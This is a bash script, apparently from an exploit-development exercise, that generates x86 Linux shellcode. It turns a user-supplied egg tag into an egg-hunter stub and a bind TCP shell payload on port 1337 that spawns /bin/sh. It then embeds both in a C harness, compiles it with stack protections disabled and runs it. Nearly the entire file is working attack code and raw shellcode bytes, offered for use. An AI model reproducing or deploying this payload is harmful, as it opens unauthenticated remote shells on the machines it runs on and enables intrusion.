#!/bin/bash
echo "========== HEX SHELL CODE GENERATOR - Egg Hunter with Bind TCP x86 Linux ==========="
read -p "Enter the tag or egg " egg
egg=`python lol.py $egg`
lol=`echo $egg`
echo "Your egg= "$lol
bind=`echo "\""$lol$lol"\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x99\xcd\x80\x96\x52\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x53\x6a\x04\x5b\x56\x89\xe1\x6a\x66\x58\xcd\x80\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80""\""`
egg=`echo "\"""\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"$egg"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7""\""`
echo "Bind shellcode port 1337 with EGG TAG = "$bind
echo "[+] Your new egg Hunter is  - "$egg
echo "[+] Pasting shellcode in C program ..."
(
cat <<EOF
#include<stdio.h>
#include<string.h>
unsigned char egg_hunter[] = \
$egg;
unsigned char egg[] = \
$bind;
void main(){
	printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter));
	printf("Length of the Actual Shellcode:  %d\n", strlen(egg));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}
EOF
) > shellcode.c
echo "[+] Compiling shellcode.c for executable shellcode...."
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode
echo "[+] Done Sir! Enjoy ;)"
